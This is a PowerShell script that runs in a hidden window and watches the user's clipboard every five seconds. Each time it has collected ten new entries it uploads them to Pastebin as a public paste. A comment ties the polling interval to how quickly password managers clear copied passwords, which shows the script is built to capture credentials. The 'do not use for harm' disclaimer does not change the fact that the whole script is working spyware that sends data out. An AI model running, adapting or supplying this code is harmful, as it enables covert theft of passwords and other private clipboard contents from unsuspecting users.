PowerShell.exe -windowstyle hidden {


# * This is to show a concept. Do not use for harm! *

$pclip = ""
$array = @()
$counter = 0



while($true){

# Get Clipboard

$cclip = Get-Clipboard



# If the current and old match...do nothing

if ($pclip -eq $cclip){}


# if they don't add to array

else {


$array += $cclip
$pclip = $cclip
$cclip = Get-Clipboard

# Add to counter 

$counter++

# Remove the hash if you wish to write to file *

#$pclip >> C:\temp\PSClippy\example.txt



}

# At 10, upload to PasteBin. You will need to add your API key *

if ($counter -gt 9){


# Format Paste

$Body = @{    api_dev_key = ‘......Add you key here....’

    api_paste_code = (“$array”)

    api_paste_private = 0

    api_paste_name = ‘....Give your name here......’

    api_option = ‘paste’

    api_user_key = ”"

}

# Upload To PasteBin

Invoke-WebRequest -Uri “https://pastebin.com/api/api_post.php" -UseBasicParsing -Body $Body -Method Post


$counter = 0

}


# This can be changed to be longer but most password managers will remove after X seconds. 

Start-Sleep -Seconds 5


} 



} # Hidden